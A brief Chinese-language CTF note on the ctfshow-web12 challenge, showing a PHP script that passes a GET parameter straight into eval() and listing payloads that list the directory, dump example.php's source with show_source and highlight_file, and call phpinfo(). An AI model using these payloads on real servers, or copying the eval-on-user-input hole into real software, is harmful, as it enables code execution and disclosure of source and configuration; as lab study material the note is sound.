---
title: "php_eval()函数读取信息"
date: 2026-07-02
---
# eval()

## ctfshow-web12

```php
<?php
        $cmd=$_GET['cmd'];
        eval($cmd);
    
            ?>
```

读取`./`目录文件

```php
?cmd=print_r(scandir('./'));
```

读取`example.php`文件

```php
?cmd=show_source('example.php');
```

读取`example.php`文件

```php
?cmd=highlight_file('example.php');
```

```php
?cmd=phpinfo();
```
